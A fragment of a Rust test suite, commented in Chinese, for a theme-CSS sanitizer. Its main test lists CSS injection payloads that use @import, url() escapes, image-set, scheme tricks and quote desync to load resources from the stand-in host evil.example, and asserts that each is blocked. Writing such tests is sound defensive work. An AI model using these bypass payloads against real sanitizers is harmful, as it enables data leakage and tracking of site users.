        let payloads = [
            // 直接形式
            r#"@import "https://evil.example/x.css";"#,
            r#"body { background: url("https://evil.example/leak.png"); }"#,
            r#"body { background: url(//evil.example/leak.png); }"#,
            // 註解前綴讓 @import 躲過行首比對
            r#"/*x*/@import "https://evil.example/x.css";"#,
            r#"/*a*/ @import "https://evil.example/x.css";"#,
            // escape 偽裝 url()
            r#"body { background: \75 rl("https://evil.example/leak.png"); }"#,
            // 二階 escape：解一次得 \75 rl(，瀏覽器自己會再解一次
            r#"body { background: \5c 75 rl(https://evil.example/leak.png); }"#,
            r#"@\69mport "https:\2f\2fevil.example/hack.css";"#,
            // image-set 系列不含 "url(" 字面
            r#"body { background-image: image-set("https://evil.example/is.png" 1x); }"#,
            r#"body { background-image: -webkit-image-set("https://evil.example/w.png" 1x); }"#,
            r#"body { background-image: image-set("//evil.example/x.png" 1x); }"#,
            // WHATWG special scheme：斜線數量寬鬆，1 個甚至 0 個都會解析成 host
            r#"body{background-image:-webkit-image-set("https:/evil.example/w.png" 1x)}"#,
            r#"body{background-image:image-set("https:evil.example/w.png" 1x)}"#,
            // 引號脫序：\22 解成裸引號後，舊實作的字串邊界全亂
            r#"body { content: "\22"; background-image: image-set("https://evil.example/y.png"); }"#,
            // 未閉合引號，連 escape 技巧都不需要
            "a{content:\"oops}\nb{background:url(\"https://evil.example/x.png\")}",
            // data: 掩護後夾帶
            r#"body { background: url("data:image/png;base64,AA"), url("https://evil.example/x.png"); }"#,
            r#"body { background-image: image-set("data:image/png;base64,AA" 1x, "https://evil.example/x.png" 2x); }"#,
            // 其他載入函式
            r#"@font-face { font-family: x; src: url("https://evil.example/f.woff2"); }"#,
            r#"body { background-image: cross-fade(url("https://evil.example/a.png"), url(b.png)); }"#,
        ];
        for payload in payloads {
            let out = sanitize_theme_css(payload);
            assert!(
                !out.contains("evil.example"),
                "payload 未被擋下:\n  輸入: {payload}\n  輸出: {out}"
            );
        }
    }

    // 新實作不改寫乾淨的 CSS——這正是舊版就地改寫做不到的（它會把
    // content: "a\22 b" 毀成 content: "a"b"）。斷言原文全等，不是「包含某片段」。
    #[test]
    fn passes_legitimate_css_through_untouched() {
        let cases = [
            r#"html[data-theme="x"] { --bg: #0d1b1e; --fg: #e0ece4; }"#,
            r#"html { --font-ui: "JetBrains Mono", ui-monospace, monospace; }"#,
            "body { background: radial-gradient(1.5px 1.5px at 70% 8%, rgba(78,204,163,0.35), transparent 60%), var(--bg); }",
            r#"body { background: url("data:image/svg+xml;base64,PHN2Zy8+"); }"#,
            // 合法 escape：舊版會破壞語法，新版原樣保留
            r#"body { content: "a\22 b"; }"#,
            "/* Theme Name: 翠綠森林 */\nhtml { --bg: #000; }",
            // 相對路徑不構成外連（CSP default-src 'self' 侷限）
            r#"body { background: url("bg.png"); }"#,
        ];
        for css in cases {
            assert_eq!(sanitize_theme_css(css), css, "合法 CSS 被改動或拒絕");
        }
    }

    // inline SVG data: URI 內含 xmlns='http://www.w3.org/2000/svg'，是 SVG 規範
    // 強制要求的字面，不是外連。內建 Office 97 主題就是這個形式——若誤判，
    // 整個主題會變空白。
    #[test]
    fn does_not_reject_inline_svg_namespace() {
        let css = "body { background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16'%3E%3C/svg%3E\"); }";
        assert_eq!(sanitize_theme_css(css), css);
    }

    // 內建模板是使用者「複製為範本」的起點，必須原樣通過。
    #[test]
    fn builtin_templates_pass_through_unchanged() {
        for (name, template) in [
            ("emerald", TEMPLATE_EMERALD_FOREST),
            ("nordic", TEMPLATE_NORDIC_FROST),
            ("office97", TEMPLATE_OFFICE_97),
        ] {
            assert_eq!(
                sanitize_theme_css(template),
                template,
                "{name} 被 sanitizer 改動或拒絕"
            );
        }
    }

    #[test]
    fn theme_name_survives_comment_stripping() {
        // parse_theme_name 讀原始檔（非淨化後），此測試確認兩者職責未混淆
        let raw = "/* Theme Name: 翠綠森林 */\nhtml { --bg: #000; }";
        assert_eq!(parse_theme_name(raw, "fallback"), "翠綠森林");
    }

    #[test]
    fn escape_decoding_reaches_fixpoint() {
        // \5c 5c 75 → 連續解碼後仍應收斂，不可無限迴圈或提早放棄
        let nested = r#"body { background: \5c 5c 75 rl(https://evil.example/x.png); }"#;
        assert!(!sanitize_theme_css(nested).contains("evil.example"));
    }
}
